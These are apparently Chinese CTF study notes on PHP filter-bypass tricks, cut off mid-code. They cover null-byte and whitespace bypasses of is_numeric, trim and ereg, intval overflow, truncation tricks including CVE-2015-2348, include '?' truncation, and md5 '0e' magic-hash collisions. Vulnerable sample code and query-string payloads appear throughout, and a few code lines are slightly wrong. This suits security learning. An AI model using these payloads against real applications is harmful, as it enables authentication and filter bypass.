<a id="user-content-绕过过滤的空白字符" class="anchor" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>绕过过滤的空白字符</h2>
<p>原理：<a href="https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6" rel="nofollow">https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6</a></p>
<pre><code>控制码
"\0" "%00" (ASCII  0 (0x00))，空字节符。

制表符
"\t" (ASCII  9 (0x09))，水平制表符。

空白字符：
"\n" (ASCII 10 (0x0A))，换行符。
"\v" "\x0b" (ASCII  11 (0x0B))，垂直制表符。
"\f" "%0c" 换页符
"\r" "%0d"(ASCII  13 (0x0D))，回车符。

空格:
" " "%20" (ASCII  32 (0x20))，普通空格符。
</code></pre>
<p>而trim过滤的空白字符有</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-k">string</span> <span class="pl-c1">trim</span> ( <span class="pl-k">string</span> <span class="pl-smi">$str</span> [, <span class="pl-k">string</span> <span class="pl-smi">$character_mask</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">"</span> <span class="pl-cce">\t\n\r</span><span class="pl-c1">\0</span><span class="pl-c1">\x0B</span><span class="pl-pds">"</span></span> ] )</span></pre></div>
<p>其中缺少了\f</p>
<p>2 函数对空白字符的特性
is_numeric函数在开始判断前，会先跳过所有空白字符。这是一个特性。
也就是说，is_numeirc(" \r\n \t 1.2")是会返回true的。同理，intval(" \r\n \t 12")，也会正常返回12。</p>
<p>案例</p>
<p><a href="https://github.com/bowu678/php_bugs/blob/master/02%20%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6.php">https://github.com/bowu678/php_bugs/blob/master/02%20%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6.php</a></p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>?number=%00%0c191</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span> 1 %00绕过is_numeric</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span> 2 \f（也就是%0c）在数字前面，trim，intval和is_numeric都会忽略这个字符</span></span></pre></div>
<h2>
<a id="user-content-intval整数溢出" class="anchor" href="#intval%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>intval整数溢出</h2>
<p>php整数上限溢出绕过intval</p>
<p>intval 函数最大的值取决于操作系统。
32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval('1000000000000') 会返回 2147483647。
64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p>
<h2>
<a id="user-content-intval-四舍五入" class="anchor" href="#intval-%E5%9B%9B%E8%88%8D%E4%BA%94%E5%85%A5" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>intval 四舍五入</h2>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span> ?a=1024.1</span></span>
<span class="pl-s1"><span class="pl-k">&lt;</span>?<span class="pl-c1">php</span></span>
<span class="pl-s1"><span class="pl-k">if</span>(<span class="pl-smi">$_GET</span>[<span class="pl-c1">id</span>]) {</span>
<span class="pl-s1"><span class="pl-c1">mysql_connect</span>(<span class="pl-c1">SAE_MYSQL_HOST_M</span> <span class="pl-k">.</span> <span class="pl-s"><span class="pl-pds">'</span>:<span class="pl-pds">'</span></span> <span class="pl-k">.</span> <span class="pl-c1">SAE_MYSQL_PORT</span>,<span class="pl-c1">SAE_MYSQL_USER</span>,<span class="pl-c1">SAE_MYSQL_PASS</span>);</span>
<span class="pl-s1"><span class="pl-c1">mysql_select_db</span>(<span class="pl-c1">SAE_MYSQL_DB</span>);</span>
<span class="pl-s1"><span class="pl-smi">$id</span> <span class="pl-k">=</span> <span class="pl-c1">intval</span>(<span class="pl-smi">$_GET</span>[<span class="pl-c1">id</span>]); <span class="pl-c"><span class="pl-c">#</span># 这里过滤只有一个intval</span></span>
<span class="pl-s1"><span class="pl-smi">$query</span> <span class="pl-k">=</span> <span class="pl-k">@</span><span class="pl-c1">mysql_fetch_array</span>(<span class="pl-c1">mysql_query</span>(<span class="pl-s"><span class="pl-pds">"</span>select content from ctf2 where id='<span class="pl-smi">$id</span>'<span class="pl-pds">"</span></span>));</span>
<span class="pl-s1"><span class="pl-k">if</span> (<span class="pl-smi">$_GET</span>[<span class="pl-c1">id</span>]<span class="pl-k">==</span><span class="pl-c1">1024</span>) {</span>
<span class="pl-s1">    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>&lt;p&gt;no! try again&lt;/p&gt;<span class="pl-pds">"</span></span>;</span>
<span class="pl-s1">    }</span>
<span class="pl-s1">  <span class="pl-k">else</span>{</span>
<span class="pl-s1">    <span class="pl-c1">echo</span>(<span class="pl-smi">$query</span>[<span class="pl-c1">content</span>]);</span>
<span class="pl-s1">  }</span>
<span class="pl-s1">}</span></pre></div>
<h2>
<a id="user-content-浮点数精度忽略" class="anchor" href="#%E6%B5%AE%E7%82%B9%E6%95%B0%E7%B2%BE%E5%BA%A6%E5%BF%BD%E7%95%A5" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>浮点数精度忽略</h2>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-k">if</span> (<span class="pl-smi">$req</span>[<span class="pl-s"><span class="pl-pds">"</span>number<span class="pl-pds">"</span></span>] <span class="pl-k">!</span><span class="pl-k">=</span> <span class="pl-c1">intval</span>(<span class="pl-smi">$req</span>[<span class="pl-s"><span class="pl-pds">"</span>number<span class="pl-pds">"</span></span>]))</span></pre></div>
<p>在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了。
输入number = 1.00000000000000010, 右边变成1.0, 而左与右比较会相等。</p>
<h2>
<a id="user-content-多重加密" class="anchor" href="#%E5%A4%9A%E9%87%8D%E5%8A%A0%E5%AF%86" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>多重加密</h2>
<p>题目中有：</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-smi">$login</span> <span class="pl-k">=</span> <span class="pl-c1">unserialize</span>(<span class="pl-c1">gzuncompress</span>(<span class="pl-c1">base64_decode</span>(<span class="pl-smi">$requset</span>[<span class="pl-s"><span class="pl-pds">'</span>token<span class="pl-pds">'</span></span>])));</span>
<span class="pl-s1"><span class="pl-k">if</span>(<span class="pl-smi">$login</span>[<span class="pl-s"><span class="pl-pds">'</span>user<span class="pl-pds">'</span></span>] <span class="pl-k">===</span> <span class="pl-s"><span class="pl-pds">'</span>ichunqiu<span class="pl-pds">'</span></span>){<span class="pl-c1">echo</span> <span class="pl-smi">$flag</span>;}</span></pre></div>
<p>本地则写：</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-pse">&lt;?php</span><span class="pl-s1"></span>
<span class="pl-s1"><span class="pl-smi">$arr</span> <span class="pl-k">=</span> <span class="pl-c1">array</span>([<span class="pl-s"><span class="pl-pds">'</span>user<span class="pl-pds">'</span></span>] <span class="pl-k">===</span> <span class="pl-s"><span class="pl-pds">'</span>ichunqiu<span class="pl-pds">'</span></span>);</span>
<span class="pl-s1"><span class="pl-smi">$token</span> <span class="pl-k">=</span> <span class="pl-c1">base64_encode</span>(<span class="pl-c1">gzcompress</span>(<span class="pl-c1">serialize</span>(<span class="pl-smi">$arr</span>)));</span>
<span class="pl-s1"><span class="pl-c1">print_r</span>(<span class="pl-smi">$token</span>);</span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span> 得到eJxLtDK0qs60MrBOAuJaAB5uBBQ=</span></span>
<span class="pl-s1"></span><span class="pl-pse"><span class="pl-s1">?</span>&gt;</span></pre></div>
<h2>
<a id="user-content-截断" class="anchor" href="#%E6%88%AA%E6%96%AD" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>截断</h2>
<h3>
<a id="user-content-iconv-异常字符截断" class="anchor" href="#iconv-%E5%BC%82%E5%B8%B8%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>iconv 异常字符截断</h3>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># 因iconv遇到异常字符就不转后面的内容了，所以可以截断。</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># 这里chr(128)到chr(255)都可以截断。</span></span>
<span class="pl-s1"><span class="pl-smi">$a</span><span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>1<span class="pl-pds">'</span></span><span class="pl-k">.</span>char(<span class="pl-c1">130</span>)<span class="pl-k">.</span><span class="pl-s"><span class="pl-pds">'</span>2<span class="pl-pds">'</span></span>;</span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-c1">iconv</span>(<span class="pl-s"><span class="pl-pds">"</span>UTF-8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>gbk<span class="pl-pds">"</span></span>,<span class="pl-smi">$a</span>); <span class="pl-c"><span class="pl-c">//</span>将字符串的编码从UTF-8转到gbk</span></span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-c1">iconv</span>(<span class="pl-s"><span class="pl-pds">'</span>GB2312<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>UTF-8<span class="pl-pds">'</span></span>, <span class="pl-smi">$str</span>); <span class="pl-c"><span class="pl-c">//</span>将字符串的编码从GB2312转到UTF-8</span></span></pre></div>
<h3>
<a id="user-content-eregiereg可用00截断" class="anchor" href="#eregiereg%E5%8F%AF%E7%94%A800%E6%88%AA%E6%96%AD" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>eregi、ereg可用%00截断</h3>
<p>功能：正则匹配过滤
条件：要求php&lt;5.3.4</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># http://127.0.0.1/Php_Bug/05.php?password=1e9%00*-*</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>GET方式提交password，然后用ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母，继续strlen()限制了长度小于8并且大小必须大于9999999，继续strpos()对password进行匹配，必须含有-，最终才输出flag</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>对于另一个难题可以使用科学计数法表示，计算器或电脑表达10的的幂是一般是e，也就是1.99714e13=19971400000000，所以构造 1e8 即 100000000 &gt; 9999999，在加上-。于是乎构造password=1e8%00*-*,成功得到答案</span></span>
<span class="pl-s1"><span class="pl-k">&lt;</span>?<span class="pl-c1">php</span></span>
<span class="pl-s1"><span class="pl-k">if</span> (<span class="pl-c1">isset</span> (<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>password<span class="pl-pds">'</span></span>])) {</span>
<span class="pl-s1">    <span class="pl-k">if</span> (<span class="pl-c1">ereg</span> (<span class="pl-s"><span class="pl-pds">"</span>^[a-zA-Z0-9]+$<span class="pl-pds">"</span></span>,<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>password<span class="pl-pds">'</span></span>]) <span class="pl-k">===</span> <span class="pl-c1">FALSE</span>)    </span>
<span class="pl-s1">       {</span>
<span class="pl-s1">        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>&lt;p&gt;You password must be alphanumeric&lt;/p&gt;<span class="pl-pds">'</span></span>;</span>
<span class="pl-s1">    }</span>
<span class="pl-s1">    <span class="pl-k">else</span> <span class="pl-k">if</span> (<span class="pl-c1">strlen</span>(<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>password<span class="pl-pds">'</span></span>]) <span class="pl-k">&lt;</span> <span class="pl-c1">8</span> <span class="pl-k">&amp;&amp;</span> <span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>password<span class="pl-pds">'</span></span>] <span class="pl-k">&gt;</span> <span class="pl-c1">9999999</span>)</span>
<span class="pl-s1">    {</span>
<span class="pl-s1">        <span class="pl-k">if</span> (<span class="pl-c1">strpos</span> (<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>password<span class="pl-pds">'</span></span>], <span class="pl-s"><span class="pl-pds">'</span>*-*<span class="pl-pds">'</span></span>) <span class="pl-k">!</span><span class="pl-k">==</span> <span class="pl-c1">FALSE</span>)</span>
<span class="pl-s1">        {</span>
<span class="pl-s1">            <span class="pl-k">die</span>(<span class="pl-s"><span class="pl-pds">'</span>Flag: <span class="pl-pds">'</span></span> <span class="pl-k">.</span> <span class="pl-smi">$flag</span>);</span>
<span class="pl-s1">        }</span>
<span class="pl-s1">        <span class="pl-k">else</span></span>
<span class="pl-s1">        {</span>
<span class="pl-s1">            <span class="pl-c1">echo</span>(<span class="pl-s"><span class="pl-pds">'</span>&lt;p&gt;*-* have not been found&lt;/p&gt;<span class="pl-pds">'</span></span>);</span>
<span class="pl-s1">        }</span>
<span class="pl-s1">    }</span>
<span class="pl-s1">    <span class="pl-k">else</span></span>
<span class="pl-s1">    {</span>
<span class="pl-s1">        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>&lt;p&gt;Invalid password&lt;/p&gt;<span class="pl-pds">'</span></span>;</span>
<span class="pl-s1">    }</span>
<span class="pl-s1">}</span></pre></div>
<h3>
<a id="user-content-move_uploaded_file-用0截断" class="anchor" href="#move_uploaded_file-%E7%94%A80%E6%88%AA%E6%96%AD" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>move_uploaded_file 用\0截断</h3>
<p>5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7
原来在高版本（受影响版本中），PHP把长度比较的安全检查逻辑给去掉了，导致了漏洞的发生
cve：
<a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348" rel="nofollow">https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348</a></p>
<p><code>move_uploaded_file($_FILES['x']['tmp_name'],"/tmp/test.php\x00.jpg")</code>
上传抓包修改name为a.php\0jpg（\0是nul字符），可以看到$_FILES['xx']['name']存储的字符串是a.php，不会包含\0截断之后的字符，因此并不影响代码的验证逻辑。
但是如果通过$_REQUEST方式获取的，则可能出现扩展名期望值不一致的情况，造成“任意文件上传”。</p>
<h3>
<a id="user-content-inclue用截断" class="anchor" href="#inclue%E7%94%A8%E6%88%AA%E6%96%AD" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>inclue用？截断</h3>
<div class="highlight highlight-text-html-php"><pre><span class="pl-pse">&lt;?php</span><span class="pl-s1"></span>
<span class="pl-s1"><span class="pl-smi">$name</span><span class="pl-k">=</span><span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>name<span class="pl-pds">'</span></span>];  </span>
<span class="pl-s1"><span class="pl-smi">$filename</span><span class="pl-k">=</span><span class="pl-smi">$name</span><span class="pl-k">.</span><span class="pl-s"><span class="pl-pds">'</span>.php<span class="pl-pds">'</span></span>;  </span>
<span class="pl-s1"><span class="pl-k">include</span> <span class="pl-smi">$filename</span>;  </span>
<span class="pl-s1"></span><span class="pl-pse"><span class="pl-s1">?</span>&gt;</span></pre></div>
<p>当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。
测试POC：
<a href="http://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt" rel="nofollow">http://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt</a>?
则会打开secret.txt中的文件内容。本测试用例在PHP5.5.38版本上测试通过。</p>
<h3>
<a id="user-content-系统长度截断" class="anchor" href="#%E7%B3%BB%E7%BB%9F%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>系统长度截断</h3>
<p>这种方式在PHP5.3以后的版本中都已经得到了修复。
win260个字符，linux下4*1024=4096字节</p>
<h3>
<a id="user-content-mysql长度截断" class="anchor" href="#mysql%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>mysql长度截断</h3>
<p>mysql内的默认字符长度为255，超过的就没了。
由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning</p>
<h3>
<a id="user-content-mysql中utf-8截断" class="anchor" href="#mysql%E4%B8%ADutf-8%E6%88%AA%E6%96%AD" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>mysql中utf-8截断</h3>
<p><code>insert into dvwa.test values (14,concat("admin",0xc1,"abc"))</code></p>
<p>写入为admin</p>
<h2>
<a id="user-content-弱类型比较" class="anchor" href="#%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>弱类型比较</h2>
<p>原理</p>
<p>比较表：<a href="http://php.net/manual/zh/types.comparisons.php" rel="nofollow">http://php.net/manual/zh/types.comparisons.php</a></p>
<p>以下等式会成立</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span> <span class="pl-k">==</span> <span class="pl-c1">0</span> <span class="pl-k">==</span> <span class="pl-c1">false</span></span>
<span class="pl-s1"><span class="pl-s"><span class="pl-pds">'</span>123<span class="pl-pds">'</span></span> <span class="pl-k">==</span> <span class="pl-c1">123</span></span>
<span class="pl-s1"><span class="pl-s"><span class="pl-pds">'</span>abc<span class="pl-pds">'</span></span> <span class="pl-k">==</span> <span class="pl-c1">0</span></span>
<span class="pl-s1"><span class="pl-s"><span class="pl-pds">'</span>123a<span class="pl-pds">'</span></span> <span class="pl-k">==</span> <span class="pl-c1">123</span></span>
<span class="pl-s1"><span class="pl-s"><span class="pl-pds">'</span>0x01<span class="pl-pds">'</span></span> <span class="pl-k">==</span> <span class="pl-c1">1</span></span>
<span class="pl-s1"><span class="pl-s"><span class="pl-pds">'</span>0e123456789<span class="pl-pds">'</span></span> <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">'</span>0e987654321<span class="pl-pds">'</span></span></span>
<span class="pl-s1">[<span class="pl-c1">false</span>] <span class="pl-k">==</span> [<span class="pl-c1">0</span>] <span class="pl-k">==</span> [<span class="pl-c1">NULL</span>] <span class="pl-k">==</span> [<span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>]</span>
<span class="pl-s1"><span class="pl-c1">NULL</span> <span class="pl-k">==</span> <span class="pl-c1">false</span> <span class="pl-k">==</span> <span class="pl-c1">0</span></span>
<span class="pl-s1"><span class="pl-c1">true</span> <span class="pl-k">==</span> <span class="pl-c1">1</span></span></pre></div>
<h3>
<a id="user-content-的弱类型比较" class="anchor" href="#%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>==、&gt;、&lt;的弱类型比较</h3>
<p>这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型转换成整型再比。</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>#方法1</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>#$a["a1"]="1e8%00";</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>#这里用%00绕过is_numeric,然后1e8可以比1336大，因此最后能$v1=1</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>#方法2</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>#$a["a1"]=["a"];</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>#使用数组，可以，因为数组恒大于数字或字符串</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>#方法3</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>#$a["a1"]=1337a;</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>#1337a过is_numeric，又由&gt;转成1337与1336比较</span></span>
<span class="pl-s1"><span class="pl-k">&lt;</span>?<span class="pl-c1">php</span></span>
<span class="pl-s1"><span class="pl-c1">is_numeric</span>(<span class="pl-k">@</span><span class="pl-smi">$a</span>[<span class="pl-s"><span class="pl-pds">"</span>a1<span class="pl-pds">"</span></span>])?<span class="pl-k">die</span>(<span class="pl-s"><span class="pl-pds">"</span>nope<span class="pl-pds">"</span></span>):<span class="pl-c1">NULL</span>;    </span>
<span class="pl-s1"><span class="pl-k">if</span>(<span class="pl-k">@</span><span class="pl-smi">$a</span>[<span class="pl-s"><span class="pl-pds">"</span>a1<span class="pl-pds">"</span></span>]){</span>
<span class="pl-s1">		<span class="pl-c1">var_dump</span>(<span class="pl-smi">$a</span>);</span>
<span class="pl-s1">        (<span class="pl-smi">$a</span>[<span class="pl-s"><span class="pl-pds">"</span>a1<span class="pl-pds">"</span></span>]<span class="pl-k">&gt;</span><span class="pl-c1">1336</span>)?<span class="pl-smi">$v1</span><span class="pl-k">=</span><span class="pl-c1">1</span>:<span class="pl-c1">NULL</span>;</span>
<span class="pl-s1">}</span>
<span class="pl-s1"><span class="pl-c1">var_dump</span>(<span class="pl-smi">$v1</span>);</span></pre></div>
<h3>
<a id="user-content-switch-弱类型" class="anchor" href="#switch-%E5%BC%B1%E7%B1%BB%E5%9E%8B" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>switch 弱类型</h3>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span> 第一种：弱类型，1e==1</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span> $x1=1e</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span> 第二种：利用数组名字bypass</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span> $x1=1[]</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span> 传入后为string(3) "1[]",但在switch那里为1</span></span>
<span class="pl-s1"><span class="pl-k">if</span> (<span class="pl-c1">isset</span>(<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>x1<span class="pl-pds">'</span></span>]))</span>
<span class="pl-s1">{ </span>
<span class="pl-s1">        <span class="pl-smi">$x1</span> <span class="pl-k">=</span> <span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>x1<span class="pl-pds">'</span></span>]; </span>
<span class="pl-s1">        <span class="pl-smi">$x1</span><span class="pl-k">==</span><span class="pl-s"><span class="pl-pds">"</span>1<span class="pl-pds">"</span></span>?<span class="pl-k">die</span>(<span class="pl-s"><span class="pl-pds">"</span>ha?<span class="pl-pds">"</span></span>):<span class="pl-c1">NULL</span>; </span>
<span class="pl-s1">        <span class="pl-k">switch</span> (<span class="pl-smi">$x1</span>) </span>
<span class="pl-s1">        { </span>
<span class="pl-s1">        <span class="pl-k">case</span> <span class="pl-c1">0</span>: </span>
<span class="pl-s1">        <span class="pl-k">case</span> <span class="pl-c1">1</span>: </span>
<span class="pl-s1">                <span class="pl-smi">$a</span><span class="pl-k">=</span><span class="pl-c1">1</span>; </span>
<span class="pl-s1">                <span class="pl-k">break</span>; </span>
<span class="pl-s1">        } </span>
<span class="pl-s1">}</span></pre></div>
<h3>
<a id="user-content-md5比较0e相等数组为null" class="anchor" href="#md5%E6%AF%94%E8%BE%830e%E7%9B%B8%E7%AD%89%E6%95%B0%E7%BB%84%E4%B8%BAnull" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>md5比较（0e相等、数组为Null）</h3>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c1">md5</span>(<span class="pl-s"><span class="pl-pds">'</span>240610708<span class="pl-pds">'</span></span>) <span class="pl-c"><span class="pl-c">//</span>0e462097431906509019562988736854</span></span>
<span class="pl-s1"><span class="pl-c1">md5</span>(<span class="pl-s"><span class="pl-pds">'</span>QNKCDZO<span class="pl-pds">'</span></span>) <span class="pl-c"><span class="pl-c">//</span>0e830400451993494058024219903391</span></span>
<span class="pl-s1">0<span class="pl-c1">e</span> 纯数字这种格式的字符串在判断相等的时候会被认为是科学计数法的数字，先做字符串到数字的转换。</span>
<span class="pl-s1"><span class="pl-c1">md5</span>(<span class="pl-s"><span class="pl-pds">'</span>240610708<span class="pl-pds">'</span></span>)<span class="pl-k">==</span><span class="pl-c1">md5</span>(<span class="pl-s"><span class="pl-pds">'</span>QNKCDZO<span class="pl-pds">'</span></span>); <span class="pl-c"><span class="pl-c">//</span>True</span></span>
<span class="pl-s1"><span class="pl-c1">md5</span>(<span class="pl-s"><span class="pl-pds">'</span>240610708<span class="pl-pds">'</span></span>)<span class="pl-k">===</span><span class="pl-c1">md5</span>(<span class="pl-s"><span class="pl-pds">'</span>QNKCDZO<span class="pl-pds">'</span></span>); <span class="pl-c"><span class="pl-c">//</span>False</span></span>
<span class="pl-s1"></span>
<span class="pl-s1">这样的对应数值还有：</span>
<span class="pl-s1"><span class="pl-c1">var_dump</span>(<span class="pl-c1">md5</span>(<span class="pl-s"><span class="pl-pds">'</span>240610708<span class="pl-pds">'</span></span>) <span class="pl-k">==</span> <span class="pl-c1">md5</span>(<span class="pl-s"><span class="pl-pds">'</span>QNKCDZO<span class="pl-pds">'</span></span>));</span>
<span class="pl-s1"><span class="pl-c1">var_dump</span>(<span class="pl-c1">md5</span>(<span class="pl-s"><span class="pl-pds">'</span>aabg7XSs<span class="pl-pds">'</span></span>) <span class="pl-k">==</span> <span class="pl-c1">md5</span>(<span class="pl-s"><span class="pl-pds">'</span>aabC9RqS<span class="pl-pds">'</span></span>));</span>
<span class="pl-s1"><span class="pl-c1">var_dump</span>(<span class="pl-c1">sha1</span>(<span class="pl-s"><span class="pl-pds">'</span>aaroZmOk<span class="pl-pds">'</span></span>) <span class="pl-k">==</span> <span class="pl-c1">sha1</span>(<span class="pl-s"><span class="pl-pds">'</span>aaK1STfY<span class="pl-pds">'</span></span>));</span>
<span class="pl-s1"><span class="pl-c1">var_dump</span>(<span class="pl-c1">sha1</span>(<span class="pl-s"><span class="pl-pds">'</span>aaO8zKZF<span class="pl-pds">'</span></span>) <span class="pl-k">==</span> <span class="pl-c1">sha1</span>(<span class="pl-s"><span class="pl-pds">'</span>aa3OFF9m<span class="pl-pds">'</span></span>));</span>
<span class="pl-s1"><span class="pl-c1">var_dump</span>(<span class="pl-s"><span class="pl-pds">'</span>0010e2<span class="pl-pds">'</span></span> <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">'</span>1e3<span class="pl-pds">'</span></span>);</span>
<span class="pl-s1"><span class="pl-c1">var_dump</span>(<span class="pl-s"><span class="pl-pds">'</span>0x1234Ab<span class="pl-pds">'</span></span> <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">'</span>1193131<span class="pl-pds">'</span></span>);</span>
<span class="pl-s1"><span class="pl-c1">var_dump</span>(<span class="pl-s"><span class="pl-pds">'</span>0xABCdef<span class="pl-pds">'</span></span> <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">'</span> 0xABCdef<span class="pl-pds">'</span></span>);</span></pre></div>
<p>技巧：找出在某一位置开始是0e的，并包含“XXX”的字符串</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>方法1</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>s1=QNKCDZO&amp;s2=240610708</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>方法2</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>?s1[]=1&amp;s2[]=2</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>利用md5中md5([1,2,3]) == md5([4,5,6]) ==NULL，md5一个list结果为Null</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>则可以使：[1] !== [2] &amp;&amp; md5([1]) ===md5([2])</span></span>
<span class="pl-s1"><span class="pl-c1">define</span>(<span class="pl-s"><span class="pl-pds">'</span>FLAG<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>pwnhub{THIS_IS_FLAG}<span class="pl-pds">'</span></span>);</span>
<span class="pl-s1"><span class="pl-k">if</span> (<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>s1<span class="pl-pds">'</span></span>] <span class="pl-k">!</span><span class="pl-k">=</span> <span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>s2<span class="pl-pds">'</span></span>]</span>
